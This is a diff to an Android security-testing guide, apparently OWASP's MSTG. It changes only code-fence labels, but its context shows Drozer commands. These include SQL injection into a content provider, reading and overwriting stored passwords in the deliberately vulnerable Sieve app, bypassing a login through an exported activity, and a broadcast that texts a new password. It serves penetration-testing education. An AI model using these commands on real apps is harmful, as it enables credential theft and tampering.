@@ -147,7 +147,7 @@ Besides going through the AndroidManifest.xml file manually, you can also use th
 
 > aapt comes with the Android SDK within the build-tools folder. It requires an APK file as input. You may list the APKs in the device by running `adb shell pm list packages -f | grep -i <keyword>` as seen in "[Listing Installed Apps](0x05b-Basic-Security_Testing.md#listing-installed-apps "Listing Installed Apps")".
 
-```shell
+```bash
 $ aapt d permissions app-x86-debug.apk
 package: sg.vp.owasp_mobile.omtg_android
 uses-permission: name='android.permission.WRITE_EXTERNAL_STORAGE'
@@ -293,7 +293,7 @@ Always check whether the application is requesting permissions it actually needs
 
 Permissions for installed applications can be retrieved with Drozer. The following extract demonstrates how to examine the permissions used by an application and the custom permissions defined by the app:
 
-```shell
+```bash
 dz> run app.package.info -a com.android.mms.service
 Package: com.android.mms.service
   Application Label: MmsService
@@ -319,7 +319,7 @@ Package: com.android.mms.service
 
 When Android applications expose IPC components to other applications, they can define permissions to control which applications can access the components. For communication with a component protected by a `normal` or `dangerous` permission, Drozer can be rebuilt so that it includes the required permission:
 
-```shell
+```bash
 $ drozer agent build  --permission android.permission.REQUIRED_PERMISSION
 ```
 
@@ -416,13 +416,13 @@ The tester should manually test the input fields with strings like `OR 1=1--` if
 
 On a rooted device, the command content can be used to query the data from a content provider. The following command queries the vulnerable function described above.
 
-```shell
+```bash
 # content query --uri content://sg.vp.owasp_mobile.provider.College/students
 ```
 
 SQL injection can be exploited with the following command. Instead of getting the record for Bob only, the user can retrieve all data.
 
-```shell
+```bash
 # content query --uri content://sg.vp.owasp_mobile.provider.College/students --where "name='Bob') OR 1=1--''"
 ```
 
@@ -577,7 +577,7 @@ Verify the usage of [`toUri`](https://developer.android.com/reference/android/co
 
 To enumerate URL schemes within an app that can be called by a web browser, use the Drozer module `scanner.activity.browsable`:
 
-```shell
+```bash
 dz> run scanner.activity.browsable -a com.google.android.apps.messaging
 Package: com.google.android.apps.messaging
   Invocable URIs:
@@ -589,7 +589,7 @@ Package: com.google.android.apps.messaging
 
 You can call custom URL schemes with the Drozer module `app.activity.start`:
 
-```shell
+```bash
 dz> run app.activity.start  --action android.intent.action.VIEW --data-uri "sms://0123456789"
 ```
 
@@ -635,7 +635,7 @@ There are multiple ways to start the dynamic analysis of your instant app. In al
 
 The installation of instant app support is taken care off through the following command:
 
-```shell
+```bash
 $ cd path/to/android/sdk/tools/bin && ./sdkmanager 'extras;google;instantapps'
 ```
 
@@ -646,7 +646,7 @@ After the preparation, you can test instant apps locally on a device running And
 - Test the app locally:
   Deploy the app via Android Studio (and enable the `Deploy as instant app` checkbox in the Run/Configuration dialog) or deploy the app using the following command:
   
-  ```shell
+  ```bash
   $ ia run output-from-build-command <app-artifact>
   ```
 
@@ -830,7 +830,7 @@ BroadcastReceivers should use the `android:permission` attribute;  otherwise, ot
 
 You can enumerate IPC components with Drozer. To list all exported IPC components, use the module `app.package.attacksurface`:
 
-```shell
+```bash
 dz> run app.package.attacksurface com.mwr.example.sieve
 Attack Surface:
   3 activities exported
@@ -844,7 +844,7 @@ Attack Surface:
 
 The "Sieve" application implements a vulnerable content provider. To list the content providers exported by the Sieve app, execute the following command:
 
-```shell
+```bash
 dz> run app.provider.finduri com.mwr.example.sieve
 Scanning com.mwr.example.sieve...
 content://com.mwr.example.sieve.DBContentProvider/
@@ -859,12 +859,12 @@ content://com.mwr.example.sieve.DBContentProvider/Keys
 
 Content providers with names like "Passwords" and "Keys" are prime suspects for sensitive information leaks. After all, it wouldn't be good if sensitive keys and passwords could simply be queried from the provider!
 
-```shell
+```bash
 dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Keys
 Permission Denial: reading com.mwr.example.sieve.DBContentProvider uri content://com.mwr.example.sieve.DBContentProvider/Keys from pid=4268, uid=10054 requires com.mwr.example.sieve.READ_KEYS, or grantUriPermission()
 ```
 
-```shell
+```bash
 dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Keys/
 | Password          | pin  |
 | SuperPassword1234 | 1234 |
@@ -872,7 +872,7 @@ dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Key
 
 This content provider can be accessed without permission.
 
-```shell
+```bash
 dz> run app.provider.update content://com.mwr.example.sieve.DBContentProvider/Keys/ --selection "pin=1234" --string Password "newpassword"
 dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Keys/
 | Password    | pin  |
@@ -883,7 +883,7 @@ dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Key
 
 To list activities exported by an application, use the module `app.activity.info`. Specify the target package with `-a` or omit the option to target all apps on the device:
 
-```shell
+```bash
 dz> run app.activity.info -a com.mwr.example.sieve
 Package: com.mwr.example.sieve
   com.mwr.example.sieve.FileSelectActivity
@@ -896,7 +896,7 @@ Package: com.mwr.example.sieve
 
 Enumerating activities in the vulnerable password manager "Sieve" shows that the activity `com.mwr.example.sieve.PWList` is exported with no required permissions. It is possible to use the module `app.activity.start` to launch this activity.
 
-```shell
+```bash
 dz> run app.activity.start --component com.mwr.example.sieve com.mwr.example.sieve.PWList
 ```
 
@@ -906,7 +906,7 @@ Since the activity is called directly in this example, the login form protecting
 
 Services can be enumerated with the Drozer module `app.service.info`:
 
-```shell
+```bash
 dz> run app.service.info -a com.mwr.example.sieve
 Package: com.mwr.example.sieve
   com.mwr.example.sieve.AuthService
@@ -919,7 +919,7 @@ To communicate with a service, you must first use static analysis to identify th
 
 Because this service is exported, you can use the module `app.service.send` to communicate with the service and change the password stored in the target application:
 
-```shell
+```bash
 dz> run app.service.send com.mwr.example.sieve com.mwr.example.sieve.AuthService --msg 6345 7452 1 --extra string com.mwr.example.sieve.PASSWORD "abcdabcdabcdabcd" --bundle-as-obj
 Got a reply from com.mwr.example.sieve/com.mwr.example.sieve.AuthService:
   what: 4
@@ -932,7 +932,7 @@ Got a reply from com.mwr.example.sieve/com.mwr.example.sieve.AuthService:
 
 Broadcasts can be enumerated via the Drozer module `app.broadcast.info`. The target package should be specified via the `-a` parameter:
 
-```shell
+```bash
 dz> run app.broadcast.info -a com.android.insecurebankv2
 Package: com.android.insecurebankv2
   com.android.insecurebankv2.MyBroadCastReceiver
@@ -943,13 +943,13 @@ In the example app "Android Insecure Bank", one broadcast receiver is exported w
 
 With the Drozer module `app.broadcast.send`, we can formulate an intent to trigger the broadcast and send the password to a phone number within our control:
 
-```shell
+```bash
 dz>  run app.broadcast.send --action theBroadcast --extra string phonenumber 07123456789 --extra string newpass 12345
 ```
 
 This generates the following SMS:
 
-```shell
+```bash
 Updated Password from: SecretPassword@ to: 12345
 ```
 
@@ -959,7 +959,7 @@ If an Android application broadcasts intents without setting a required permissi
 
 To register a broadcast receiver to sniff intents, use the Drozer module `app.broadcast.sniff` and specify the action to monitor with the `--action` parameter:
 
-```shell
+```bash
 dz> run app.broadcast.sniff  --action theBroadcast
 [*] Broadcast receiver registered to sniff matching intents
 [*] Output is updated once a second. Press Control+C to exit.
